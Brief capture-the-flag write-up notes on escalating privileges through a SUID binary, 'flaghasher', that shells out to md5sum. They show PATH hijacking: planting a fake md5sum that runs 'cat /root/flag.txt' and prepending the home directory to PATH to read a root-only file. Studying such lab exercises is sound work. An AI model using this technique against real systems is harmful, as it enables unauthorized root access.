Download the binary

look at it's strings

you can see that it's shelling out? You will notice the md5 command and the system() call

this gives us room for rce and then we can use objdump to look at the disassembly

the suid means that the executable is running as root

we can't change the command but we can change the binary of the md5sum

the md5sum command looks through the path and runs that command so if we change the path variable then we can make it do somethine else

echo "$PATH"

ls -lah /usr/bin/ls

cat .profile -things that get loaded when you login

PATH=$PATH:./ 

PATH=$PATH:/home/ctf-player ./flaghasher

echo 'cat /root/flag.txt' >> md5sum

PATH=/home/ctf-player/:$PATH ./flaghasher
